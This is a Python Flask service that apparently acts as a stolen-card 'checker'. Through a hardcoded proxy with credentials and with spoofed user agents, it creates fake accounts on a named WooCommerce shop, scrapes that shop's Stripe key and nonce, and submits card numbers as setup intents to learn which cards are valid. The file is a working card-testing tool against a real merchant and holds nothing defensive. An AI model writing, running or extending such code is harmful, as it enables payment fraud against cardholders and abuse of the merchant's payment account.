import os
import requests
import re
import json
import uuid
import random
import time
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS
from faker import Faker
from bs4 import BeautifulSoup

app = Flask(__name__)
CORS(app)

fake = Faker()
domain = "https://www.epicalarc.com"
# Default proxy from stau.py
DEFAULT_PROXY = "http://tickets:proxyon145@23.108.233.92:12345"

live_logs = []

def log(msg, type="info"):
    now = datetime.now().strftime("%H:%M:%S")
    formatted = f"[{now}] {msg}"
    print(formatted)
    live_logs.append({"msg": msg, "type": type, "time": now})

def gets(s, start, end):
    try: return s.split(start)[1].split(end)[0]
    except: return None

def get_proxy():
    if os.path.exists("proxy.txt"):
        try:
            with open("proxy.txt", "r") as f:
                px = f.read().strip().split(':')
                if len(px) == 4:
                    return f"http://{px[2]}:{px[3]}@{px[0]}:{px[1]}"
        except: pass
    return DEFAULT_PROXY

def generate_user():
    fname = fake.first_name().lower()
    lname = fake.last_name().lower()
    email = f"{fname}{lname}{random.randint(1000,9999)}@gmail.com"
    password = fake.password(length=12, special_chars=True)
    return fname, lname, email, password

def get_creds():
    """Perform registration and extract Stripe PK & Nonce"""
    session = requests.Session()
    proxy = get_proxy()
    session.proxies = {"http": proxy, "https": proxy}
    
    try:
        fname, lname, email, password = generate_user()
        log(f"👤 Registering: {email}", "pending")
        
        headers = {"User-Agent": fake.user_agent()}
        
        # 1. Get Nonce
        res = session.get(f"{domain}/my-account/", headers=headers, timeout=15)
        soup = BeautifulSoup(res.text, "html.parser")
        nonce = soup.find("input", {"name": "woocommerce-register-nonce"})["value"]
        referer = soup.find("input", {"name": "_wp_http_referer"})["value"]
        
        # 2. Register
        reg_data = {
            "email": email,
            "password": password,
            "register": "Register",
            "woocommerce-register-nonce": nonce,
            "_wp_http_referer": referer,
        }
        headers.update({
            "origin": domain,
            "referer": f"{domain}/my-account/",
            "content-type": "application/x-www-form-urlencoded",
        })
        
        session.post(f"{domain}/my-account/", headers=headers, data=reg_data, timeout=15)
        
        # 3. Get Stripe Data
        res = session.get(f"{domain}/my-account/add-payment-method/", headers=headers, timeout=15)
        html = res.text
        
        stripe_pk = re.search(r'pk_(live|test)_[0-9a-zA-Z]+', html)
        ajax_nonce = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', html)
        
        if not stripe_pk or not ajax_nonce:
            log("❌ Extraction failed (PK/Nonce not found)", "error")
            return None, None
            
        log("✅ Auth Ready", "success")
        return session, {"pk": stripe_pk.group(0), "nonce": ajax_nonce.group(1)}
        
    except Exception as e:
        log(f"❌ Auth Error: {str(e)}", "error")
        return None, None

def check_card_logic(card_data, session, creds):
    try:
        cc, mm, yy, cvv = card_data.split('|')
        if len(yy) == 2: yy = "20" + yy
        
        log(f"💳 Tokenizing {cc[:6]}...", "pending")
        
        # 1. Stripe Tokenize (Payment Method)
        headers = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "user-agent": fake.user_agent(),
        }
        pm_data = {
            "type": "card",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_year]": yy,
            "card[exp_month]": mm,
            "billing_details[address][postal_code]": "10001",
            "billing_details[address][country]": "US",
            "payment_user_agent": "stripe.js/84a6a3d5; stripe-js-v3/84a6a3d5; payment-element",
            "key": creds['pk'],
            "_stripe_version": "2024-06-20",
        }
        
        r_pm = requests.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=pm_data, timeout=15)
        pm_id = r_pm.json().get("id")
        
        if not pm_id:
            msg = r_pm.json().get("error", {}).get("message", "Tokenization Failed")
            return f"❌ Stripe: {msg}"
            
        log("✅ Card Tokenized", "success")
        
        # 2. Confirm Setup Intent (The check)
        log("🔍 Confirming...", "pending")
        headers = {
            "x-requested-with": "XMLHttpRequest",
            "origin": domain,
            "referer": f"{domain}/my-account/add-payment-method/",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "user-agent": fake.user_agent(),
        }
        confirm_data = {
            "action": "create_and_confirm_setup_intent",
            "wc-stripe-payment-method": pm_id,
            "wc-stripe-payment-type": "card",
            "_ajax_nonce": creds['nonce'],
        }
        
        res = session.post(f"{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", headers=headers, data=confirm_data, timeout=20)
        
        try:
            res_json = res.json()
        except:
            return f"❌ Server Error: {res.text[:50]}"
            
        if res_json.get("success") and res_json.get("data", {}).get("status") == "succeeded":
            return "✅ CARD_ADDED"
        else:
            msg = res_json.get("data", {}).get("error", {}).get("message")
            if not msg: msg = res_json.get("data", {}).get("message", "Declined")
            return f"❌ {msg}"

    except Exception as e:
        return f"❌ System Error: {str(e)}"

@app.route('/api/check-card', methods=['POST', 'GET'])
def api_check():
    data = {}
    if request.is_json: data.update(request.get_json() or {})
    data.update(request.form or {})
    data.update(request.args or {})
        
    cc_full = data.get('cc') or data.get('lista')
    if not cc_full:
        cn, em, ey, cv = data.get('card_number'), data.get('exp_month'), data.get('exp_year'), data.get('cvv')
        if cn and em and ey and cv: cc_full = f"{cn}|{em}|{ey}|{cv}"
            
    if not cc_full:
        return jsonify({"error": "Missing data (Need cc or card_number/exp_month/exp_year/cvv)"}), 400
    
    log(f"🚀 Auth check for {cc_full[:6]}...", "pending")
    session, creds = get_creds()
    if not creds:
        return jsonify({"status": "Session Failed (Site Block)"}), 500
    
    result = check_card_logic(cc_full, session, creds)
    log(f"📋 Result: {result}", "info")
    session.close()
    
    # Process result for better bot compatibility
    is_success = "SUCCESS" in result or "✅" in result
    status_code = "success" if is_success else "declined"
    clean_msg = result.replace("✅", "").replace("❌", "").strip()
    
    return jsonify({
        "status": status_code,
        "message": clean_msg,
        "response": clean_msg
    })

@app.route('/api/logs', methods=['GET'])
def get_logs():
    return jsonify(live_logs)

@app.route('/')
def home():
    """Gateway status page"""
    return f"""
    <html>
    <head>
        <title>Stripe Auth Gateway 2 - Epical Arc</title>
        <style>
            body {{ font-family: Arial; background: #0a0b10; color: white; padding: 40px; }}
            .container {{ max-width: 800px; margin: 0 auto; }}
            h1 {{ color: #00f2ff; }}
            .status {{ background: rgba(0,242,255,0.1); padding: 20px; border-radius: 10px; margin: 20px 0; }}
            .test-url {{ background: #1a1b20; padding: 15px; border-radius: 5px; font-family: monospace; }}
            .info {{ color: #888; margin: 10px 0; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🔐 Stripe Auth Gateway 2</h1>
            <div class="status">
                <h2>✅ Gateway Online</h2>
                <p class="info">Site: epicalarc.com</p>
                <p class="info">Method: WooCommerce Stripe Setup Intent</p>
                <p class="info">Type: Authentication (No Charge)</p>
            </div>
            
            <h3>📋 Test URL:</h3>
            <div class="test-url">
                GET/POST: http://localhost:8081/api/check-card?cc=4532015112830366|12|2027|123
            </div>
            
            <h3>📊 Live Logs:</h3>
            <div class="test-url">
                GET: http://localhost:8081/api/logs
            </div>
            
            <p class="info">💡 Tip: Use this gateway for Stripe Auth checks without charging cards.</p>
        </div>
    </body>
    </html>
    """

if __name__ == '__main__':
    # Running on 8081 to avoid conflict with ba.py
    app.run(host='0.0.0.0', port=8081)
